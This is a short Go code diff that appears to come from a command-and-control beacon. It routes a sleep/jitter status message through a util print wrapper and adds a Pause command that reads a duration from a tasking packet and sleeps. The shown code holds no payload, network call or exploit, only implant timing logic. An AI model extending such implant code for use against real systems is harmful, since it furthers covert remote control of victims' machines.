@@ -2,9 +2,9 @@ package command
 
 import (
 	"bytes"
-	"fmt"
 	"main/config"
 	"main/packet"
+	"main/util"
 	"math/rand"
 	"time"
 )
@@ -154,7 +154,7 @@ func ChangeSleep(b []byte) {
 	buf := bytes.NewBuffer(b)
 	sleep := packet.ReadInt(buf)
 	jitter := packet.ReadInt(buf)
-	fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
+	util.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
 	config.WaitTime = int(sleep)
 	config.Jitter = int(jitter)
 }
@@ -167,4 +167,11 @@ func Sleep() {
 
 	}
 	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
+}
+
+func Pause(b []byte) {
+	buf := bytes.NewBuffer(b)
+	pauseTime := packet.ReadInt(buf)
+	util.Println(util.Sprintf("Pause time: %d", pauseTime))
+	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
 }
